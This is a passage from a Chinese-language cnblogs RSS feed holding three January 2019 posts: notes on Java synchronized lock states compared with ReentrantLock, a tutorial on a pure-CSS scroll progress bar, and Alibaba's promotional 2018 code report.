&lt;p data-anchor-id=&quot;dcja&quot;&gt;类型指针指向对象的类元数据&lt;strong&gt;metadata&lt;/strong&gt;，虚拟机通过这个指针确定该对象是哪个类的实例。&lt;/p&gt;
&lt;h4 id=&quot;锁状态&quot; data-anchor-id=&quot;rnr4&quot;&gt;锁状态&lt;/h4&gt;
&lt;table class=&quot;table table-striped-white table-bordered&quot; data-anchor-id=&quot;zjwy&quot;&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;&lt;span&gt;biased_lock&lt;/span&gt;&lt;/th&gt;
&lt;th&gt;&lt;span&gt;lock&lt;/span&gt;&lt;/th&gt;
&lt;th&gt;&lt;span&gt;状态&lt;/span&gt;&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;0&lt;/span&gt;&lt;/td&gt;
&lt;td&gt;&lt;span&gt;01&lt;/span&gt;&lt;/td&gt;
&lt;td&gt;&lt;span&gt;无锁&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;1&lt;/span&gt;&lt;/td&gt;
&lt;td&gt;&lt;span&gt;01&lt;/span&gt;&lt;/td&gt;
&lt;td&gt;&lt;span&gt;偏向锁&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;0&lt;/span&gt;&lt;/td&gt;
&lt;td&gt;&lt;span&gt;00&lt;/span&gt;&lt;/td&gt;
&lt;td&gt;&lt;span&gt;轻量级锁&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;0&lt;/span&gt;&lt;/td&gt;
&lt;td&gt;&lt;span&gt;10&lt;/span&gt;&lt;/td&gt;
&lt;td&gt;&lt;span&gt;重量级锁&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;0&lt;/span&gt;&lt;/td&gt;
&lt;td&gt;&lt;span&gt;11&lt;/span&gt;&lt;/td&gt;
&lt;td&gt;&lt;span&gt;GC标记&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;h3 id=&quot;jdk对synchronized的优化&quot; data-anchor-id=&quot;bf4j&quot;&gt;JDK对synchronized的优化&lt;/h3&gt;
&lt;p data-anchor-id=&quot;9r8q&quot;&gt;jdk1.6之前synchronized是很重的，所以并不被开发者偏爱，随着后续版本jdk对synchronized的优化使其越来越轻量，它还是很好用的，甚至ConcurrentHashMap在jdk的put方法都在jdk1.8时从ReetrantLock.tryLock()改为用synchronized来实现同步。&lt;br/&gt;并且还引入了偏向锁，轻量级锁等概念，下面是偏向锁和轻量级锁的获取流程&lt;/p&gt;
&lt;p data-anchor-id=&quot;9r8q&quot;&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1401002/201901/1401002-20190109115450150-1120221210.png&quot; alt=&quot;&quot; width=&quot;1381&quot; height=&quot;873&quot;/&gt;&lt;/p&gt;
&lt;p data-anchor-id=&quot;9r8q&quot;&gt; &lt;/p&gt;
&lt;p data-anchor-id=&quot;9r8q&quot;&gt;&lt;em id=&quot;__mceDel&quot;&gt;![偏向锁和轻量级锁的获取流程] &lt;a href=&quot;https://www.processon.com/diagraming/5c25db87e4b016324f447c95&quot; target=&quot;_blank&quot;&gt;https://www.processon.com/diagraming/5c25db87e4b016324f447c95&lt;/a&gt; 【ProncessOn 公开克隆】&lt;/em&gt;&lt;/p&gt;
&lt;p data-anchor-id=&quot;9r8q&quot;&gt;&lt;img src=&quot;https://www.processon.com/diagraming/5c25db87e4b016324f447c95&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;[参考] 链接：&lt;a href=&quot;https://pan.baidu.com/s/1gA_URintNDiq_SuAbJQE2Q&quot; target=&quot;_blank&quot;&gt;https://pan.baidu.com/s/1gA_URintNDiq_SuAbJQE2Q&lt;/a&gt; 提取码：s6vx 【咕泡学院公开课】&lt;/p&gt;
&lt;h4 id=&quot;偏向锁-baisedlock&quot; data-anchor-id=&quot;gf9u&quot;&gt;偏向锁 baised_lock&lt;/h4&gt;
&lt;p data-anchor-id=&quot;p8f3&quot;&gt;如果一个线程获取了偏向锁，那么如果在接下来的一段时间里，如果没有其他线程来抢占锁，那么获取锁的线程在下一次进入方法时不需要重新获取锁。&lt;/p&gt;
&lt;p data-anchor-id=&quot;p8f3&quot;&gt; &lt;/p&gt;
&lt;h2 id=&quot;synchronized与reentrantlock的区别&quot; data-anchor-id=&quot;zics&quot;&gt;synchronized与ReentrantLock的区别&lt;/h2&gt;
&lt;p data-anchor-id=&quot;g1fp&quot;&gt;[参考] &lt;a href=&quot;https://time.geekbang.org/column/article/8799&quot; target=&quot;_blank&quot;&gt;https://time.geekbang.org/column/article/8799&lt;/a&gt; 【极客时间，Java核心技术36讲专栏】&lt;/p&gt;
&lt;table class=&quot;table table-striped-white table-bordered&quot; data-anchor-id=&quot;hip3&quot;&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;&lt;span&gt;区别&lt;/span&gt;&lt;/th&gt;
&lt;th&gt;&lt;span&gt;synchronized&lt;/span&gt;&lt;/th&gt;
&lt;th&gt;&lt;span&gt;ReentrantLock&lt;/span&gt;&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody readability=&quot;11&quot;&gt;&lt;tr readability=&quot;4&quot;&gt;&lt;td&gt;&lt;span&gt;灵活性&lt;/span&gt;&lt;/td&gt;
&lt;td&gt;&lt;span&gt;代码简单，自动获取、释放锁&lt;/span&gt;&lt;/td&gt;
&lt;td&gt;&lt;span&gt;相对繁琐，需要手动获取、释放锁&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;是否可重入&lt;/span&gt;&lt;/td&gt;
&lt;td&gt;&lt;span&gt;是&lt;/span&gt;&lt;/td&gt;
&lt;td&gt;&lt;span&gt;是&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;&lt;span&gt;作用位置&lt;/span&gt;&lt;/td&gt;
&lt;td&gt;&lt;span&gt;可作用在方法和代码块&lt;/span&gt;&lt;/td&gt;
&lt;td&gt;&lt;span&gt;只能用在代码块&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;7&quot;&gt;&lt;td&gt;&lt;span&gt;获取、释放锁的方式&lt;/span&gt;&lt;/td&gt;
&lt;td&gt;&lt;span&gt;monitorenter、monitorexit、ACC_SYNCHRONIZED&lt;/span&gt;&lt;/td&gt;
&lt;td&gt;&lt;span&gt;尝试非阻塞获取锁tryLock()、超时获取锁tryLock(long timeout,TimeUnit unit)、unlock()&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;&lt;span&gt;获取锁的结果&lt;/span&gt;&lt;/td&gt;
&lt;td&gt;&lt;span&gt;不知道&lt;/span&gt;&lt;/td&gt;
&lt;td&gt;&lt;span&gt;可知，tryLock()返回boolean&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;11.5&quot;&gt;&lt;td&gt;&lt;span&gt;使用注意事项&lt;/span&gt;&lt;/td&gt;
&lt;td readability=&quot;7&quot;&gt;
&lt;p&gt;&lt;span&gt;1、锁对象不能为空（锁保存在对象头中，null没有对象头）&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;2、作用域不宜过大&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td readability=&quot;8&quot;&gt;
&lt;p&gt;&lt;span&gt;1、切记要在finally中unlock()，否则会形成死锁&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;2、不要将获取锁的过程写在try块内，因为如果在获取锁时发生了异常，异常抛出的同时，也会导致锁无故被释放。&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p data-anchor-id=&quot;fh9p&quot;&gt; &lt;/p&gt;
&lt;/div&gt;

</description>
<pubDate>Wed, 09 Jan 2019 06:39:00 +0000</pubDate>
<dc:creator>Marksmanbat</dc:creator>
<og:description>深入理解synchronized关键字 synchronized是并发编程中重要的使用工具之一，我们必须学会使用并且掌握它的原理。 概念及作用 JVM自带的关键字，可在需要线程安全的业务场景中使用，来</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/-Marksman/p/10232382.html</dc:identifier>
</item>
<item>
<title>不可思议的纯 CSS 滚动进度条效果 - ChokCoco</title>
<link>http://www.cnblogs.com/coco1s/p/10244168.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/coco1s/p/10244168.html</guid>
<description>&lt;p&gt;&lt;span&gt;结论先行，如何使用 CSS 实现下述滚动条效果？&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;a href=&quot;https://user-images.githubusercontent.com/8554143/50879370-a5cc2900-1415-11e9-89ba-40713de326f5.gif&quot; rel=&quot;noopener noreferrer&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/8554143/50879370-a5cc2900-1415-11e9-89ba-40713de326f5.gif&quot; alt=&quot;scrollbar&quot;/&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;就是顶部黄色的滚动进度条，随着页面的滚动进度而变化长短。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;在继续阅读下文之前，你可以先缓一缓。尝试思考一下上面的效果或者动手尝试一下，不借助 JS ，能否巧妙的实现上述效果。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;OK，继续。这个效果是我在业务开发的过程中遇到的一个类似的小问题。其实即便让我借助 Javascript ，我的第一反应也是，感觉很麻烦啊。所以我一直在想，有没有可能只使用 CSS 完成这个效果呢？&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;a href=&quot;https://user-images.githubusercontent.com/8554143/50879649-a1544000-1416-11e9-826f-15bbde1346ee.png&quot; rel=&quot;noopener noreferrer&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/8554143/50879649-a1544000-1416-11e9-826f-15bbde1346ee.png&quot; alt=&quot;image&quot;/&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h2&gt;&lt;span&gt; &lt;/span&gt;&lt;/h2&gt;
&lt;h2&gt;&lt;span&gt;分析需求&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;第一眼看到这个效果，感觉这个跟随滚动动画，仅靠 CSS 是不可能完成的，因为这里涉及了页面滚动距离的计算。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;如果想只用 CSS 实现，只能另辟蹊径，使用一些讨巧的方法。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;好，下面就借助一些奇技淫巧，使用 CSS 一步一步完成这个效果。分析一下难点：&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;&lt;span&gt;如何得知用户当前滚动页面的距离并且通知顶部进度条？&lt;/span&gt;&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;span&gt;正常分析应该是这样的，但是这就陷入了传统的思维。进度条就只是进度条，接收页面滚动距离，改变宽度。如果页面滚动和进度条是一个整体呢？&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;  &lt;/span&gt;&lt;/p&gt;
&lt;h2&gt;&lt;span&gt;实现需求&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;不卖关子了，下面我们运用线性渐变来实现这个功能。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;假设我们的页面被包裹在 &lt;code&gt;&amp;lt;body&amp;gt;&lt;/code&gt; 中，可以滚动的是整个 body，给它添加这样一个从左下到到右上角的线性渐变：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;35&quot;&gt;
&lt;pre class=&quot;brush:css;gutter:true;&quot;&gt;
body {
    background-image: linear-gradient(to right top, #ffcc00 50%, #eee 50%);
    background-repeat: no-repeat;
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;那么，我们可以得到一个这样的效果：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;a href=&quot;https://user-images.githubusercontent.com/8554143/50879862-643c7d80-1417-11e9-8600-4133b0751626.gif&quot; rel=&quot;noopener noreferrer&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/8554143/50879862-643c7d80-1417-11e9-8600-4133b0751626.gif&quot; alt=&quot;scrollbar2&quot;/&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;Wow，黄色块的颜色变化其实已经很能表达整体的进度了。其实到这里，聪明的同学应该已经知道下面该怎么做了。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;我们运用一个伪元素，把多出来的部分遮住：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;33&quot;&gt;
&lt;pre class=&quot;brush:css;gutter:true;&quot;&gt;
body::after {
    content: &quot;&quot;;
    position: fixed;
    top: 5px;
    left: 0;
    bottom: 0;
    right: 0;
    background: #fff;
    z-index: -1;
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;为了方便演示，我把上面白色底改成了黑色透明底，：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;a href=&quot;https://user-images.githubusercontent.com/8554143/50880203-871b6180-1418-11e9-8588-f0be26721fbe.gif&quot; rel=&quot;noopener noreferrer&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/8554143/50880203-871b6180-1418-11e9-8588-f0be26721fbe.gif&quot; alt=&quot;scrollbar3&quot;/&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;实际效果达成了这样：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;a href=&quot;https://user-images.githubusercontent.com/8554143/50880270-d6619200-1418-11e9-97c7-601f7aca01e7.gif&quot; rel=&quot;noopener noreferrer&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/8554143/50880270-d6619200-1418-11e9-97c7-601f7aca01e7.gif&quot; alt=&quot;scrollbar4&quot;/&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;眼尖的同学可能会发现，这样之后，滑到底的时候，进度条并没有到底：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;a href=&quot;https://user-images.githubusercontent.com/8554143/50880349-19236a00-1419-11e9-8a85-8d14ace2ac86.png&quot; rel=&quot;noopener noreferrer&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/8554143/50880349-19236a00-1419-11e9-8a85-8d14ace2ac86.png&quot; alt=&quot;image&quot;/&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;究其原因，是因为 &lt;code&gt;body&lt;/code&gt; 的线性渐变高度设置了整个 body 的大小，我们调整一下渐变的高度：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;35&quot;&gt;
&lt;pre class=&quot;brush:css;gutter:true;&quot;&gt;
body {
    background-image: linear-gradient(to right top, #ffcc00 50%, #eee 50%);
    background-size: 100% calc(100% - 100vh + 5px);
    background-repeat: no-repeat;
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;这里使用了 &lt;code&gt;calc&lt;/code&gt; 进行了运算，减去了 &lt;code&gt;100vh&lt;/code&gt;，也就是减去一个屏幕的高度，这样渐变刚好在滑动到底部的时候与右上角贴合。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;而 &lt;code&gt;+ 5px&lt;/code&gt; 则是滚动进度条的高度，预留出 &lt;code&gt;5px&lt;/code&gt; 的高度。再看看效果，完美：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;a href=&quot;https://user-images.githubusercontent.com/8554143/50879370-a5cc2900-1415-11e9-89ba-40713de326f5.gif&quot; rel=&quot;noopener noreferrer&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/8554143/50879370-a5cc2900-1415-11e9-89ba-40713de326f5.gif&quot; alt=&quot;scrollbar&quot;/&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;至此，这个需求就完美实现拉，算是一个不错的小技巧，完整的 Demo：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;a href=&quot;https://codepen.io/Chokcoco/pen/KbBXQM?editors=1100&quot; rel=&quot;nofollow&quot;&gt;CodePen Demo -- 使用线性渐变实现滚动进度条&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;a href=&quot;https://user-images.githubusercontent.com/8554143/50879922-a36ace80-1417-11e9-9b16-fc195d66e982.png&quot; rel=&quot;noopener noreferrer&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/8554143/50879922-a36ace80-1417-11e9-9b16-fc195d66e982.png&quot; alt=&quot;image&quot;/&gt;&lt;/a&gt; &lt;/span&gt;&lt;/p&gt;
&lt;h2&gt;&lt;span&gt;  &lt;/span&gt;&lt;/h2&gt;
&lt;h2&gt;&lt;span&gt;最后&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;其实这只是非常牛逼的渐变非常小的一个技巧。更多你想都想不到的有趣的 CSS 你可以来这里瞧瞧：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;a href=&quot;https://github.com/chokcoco/CSS-Inspiration&quot;&gt;CSS-Inspiration -- CSS灵感&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;更多精彩 CSS 技术文章汇总在我的 &lt;a href=&quot;https://github.com/chokcoco/iCSS&quot;&gt;Github -- iCSS&lt;/a&gt; ，持续更新，欢迎点个 star 订阅收藏。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;好了，本文到此结束，希望对你有帮助 :)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;如果还有什么疑问或者建议，可以多多交流，原创文章，文笔有限，才疏学浅，文中若有不正之处，万望告知。&lt;/span&gt;&lt;/p&gt;


</description>
<pubDate>Wed, 09 Jan 2019 06:34:00 +0000</pubDate>
<dc:creator>ChokCoco</dc:creator>
<og:description>结论先行，如何使用 CSS 实现下述滚动条效果？ 就是顶部黄色的滚动进度条，随着页面的滚动进度而变化长短。 在继续阅读下文之前，你可以先缓一缓。尝试思考一下上面的效果或者动手尝试一下，不借助 JS ，</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/coco1s/p/10244168.html</dc:identifier>
</item>
<item>
<title>12亿行代码，阿里巴巴这一年的技术报告和梦想报告 - 阿里云云栖社区</title>
<link>http://www.cnblogs.com/yunqishequ/p/10244191.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/yunqishequ/p/10244191.html</guid>
<description>&lt;p data-spm-anchor-id=&quot;a2c4e.11153940.blogcont685497.i0.69282ef0KxlgkV&quot;&gt;　　78年前，图灵用代码编译出的情报破解系统，让二战至少提前2年结束，挽救了2000万人的生命；50年前，登月科学家敲下的一行关键代码，启动了阿波罗号的着陆，成就了人类的一大步；30年前，蒂姆·伯纳斯·李利用代码创造了万维网，让普通人也能够通过互联网连接全世界……如同数字世界的艺术家、数字文明的建筑师，各个时代的工程师科学家们正在用一行行代码改变世界。阿里巴巴是这个时代的技术追梦人。2019年1月9日，阿里巴巴公布了其2018年度代码报告。报告显示，阿里工程师在2018年共写下了12亿行代码，总代码长度可绕地球4.49圈。&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1482139/201901/1482139-20190109142947188-1172951963.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;代码是IT行业的根基和基础。人们熟悉的Windows操作系统，是有史以来最复杂的软件之一，其总代码数大约为5000万行。这意味着，阿里工程师一年写下的代码总数相当于24个Windows的开发量。&lt;/p&gt;
&lt;p&gt;在代码语言规范上的努力和对语言美感的追求是衡量一个科技公司对行业贡献的重要标准。通过两年多的努力，阿里巴巴已经在内部实现了代码规范的“书同文”，对外推出了《阿里巴巴Java开发规约》。杭州成了全球Java规范的策源地。阿里基于开发规约推出的编码插件在全球范围内被下载了110万次，帮助数千家企业解决了1亿多个代码的不规范问题。&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1482139/201901/1482139-20190109143003009-1572071243.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;共同分享共同进步的开源精神是技术人和开发者的精神底色，阿里技术人坚持拥抱开源、回报开源。目前阿里巴巴已经有400多个开源项目，涉及中间件、框架、组件、数据库、存储等，包括滴滴、网易、Netflix、Uber在内的互联网公司都是阿里开源项目的使用者。有3600多位阿里工程师们成为了开源项目的贡献者，他们过去在开源社区里共获得了30多万个星星，在GitHub贡献排行榜上，阿里是唯一一家入围顶尖贡献名单的中国公司。&lt;/p&gt;
&lt;p&gt;因为阿里工程师的贡献，阿里巴巴在2018年还获邀加入Java全球管理组织Java Community Process (JCP)的最高执行委员会，这也是中国企业首次加入到Java全球标准的制定中，推动更多“中国标准”成为全球规范。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1482139/201901/1482139-20190109143015694-27349882.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;12亿行代码背后是阿里工程师和科学家们的技术梦想和家国情怀。键盘间行云流水的代码最终变成了推动科技突破与社会发展的密码，是多个前沿科技领域科研水平的提速，是城市管理模式的日趋精细化，是中国制造业的整体转型升级，是社会民生难题的切实解决方案。&lt;/p&gt;
&lt;p data-spm-anchor-id=&quot;a2c4e.11153940.blogcont685497.i1.69282ef0KxlgkV&quot;&gt;2018年5月，阿里巴巴达摩院量子实验室的科学家利研发出当前世界最强的量子电路模拟器“太章”，率先成功模拟了81比特40层作为基准的谷歌随机量子电路。《连线》杂志认为，这一研究突破意味着，谷歌依靠72比特量子计算机问鼎量子霸权的计划或被推翻。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1482139/201901/1482139-20190109143024157-438988118.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;（“太章”拟基于该模拟器模拟的随机量子电路规模（黑线）与当前硬件可以实现的规模(红线)比较）&lt;/p&gt;
&lt;p&gt;阿里工程师还联合天文学家们开启了向宇宙深处的探索。他们与耶鲁大学合作，对39.13光年外的一个恒星系统进行研究，那里或将发现适宜生命居住的“第二地球”。他们还开发了一个适用于分析卫星遥感数据的AI，每天能够完成对北京郊区近150万亩的耕地状况的实时分析，从中找出破坏农田的违法行为，成功守护了百万亩农田。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1482139/201901/1482139-20190109143032949-108413998.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p data-spm-anchor-id=&quot;a2c4e.11153940.blogcont685497.i4.69282ef0KxlgkV&quot;&gt;2018年，阿里工程师们给海内外的20多座城市装上了大脑。在浙江杭州，城市大脑覆盖全城420平方公里，降低了3.5%城市交通拥堵，让杭州脱离堵城行列。同时，城市大脑的能力从交通领域延展至包括在消防、城建、环境在内的城市精细化管理。在人类最关心的生命健康问题上，阿里巴巴的工程师们开发的医疗AI已可准确地测量肝结节，对判断肝结节是否为恶性和临床医疗有促进作用。2018年，问题疫苗事件牵动无数国人，阿里健康的工程师，连夜开发了一个“疫苗查询”功能，用技术让国人追踪疫苗来源，获得社会各界赞扬。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1482139/201901/1482139-20190109143043533-992879225.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p data-spm-anchor-id=&quot;a2c4e.11153940.blogcont685497.i2.69282ef0KxlgkV&quot;&gt;过去的一年，阿里巴巴的工程师们不仅在办公室里写代码，他们还深入到工厂车间，和工人师傅面对面交流。通过云计算、IoT、AI，阿里巴巴正在驱动中国制造业数字化转型，为世界工厂带来了一个个珍贵的“1%良品率”提升和一个个数字化转型成功案例。&lt;/p&gt;

&lt;p&gt;&lt;br/&gt;&lt;a href=&quot;https://yq.aliyun.com/articles/685497?utm_content=g_1000036243#&quot; target=&quot;_blank&quot;&gt;原文链接&lt;/a&gt;&lt;br/&gt;本文为云栖社区原创内容，未经允许不得转载。&lt;/p&gt;
</description>
<pubDate>Wed, 09 Jan 2019 06:31:00 +0000</pubDate>
<dc:creator>阿里云云栖社区</dc:creator>
<og:description>78年前，图灵用代码编译出的情报破解系统，让二战至少提前2年结束，挽救了2000万人的生命；50年前，登月科学家敲下的一行关键代码，启动了阿波罗号的着陆，成就了人类的一大步；30年前，蒂姆·</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/yunqishequ/p/10244191.html</dc:identifier>
</item>
</channel>
</rss>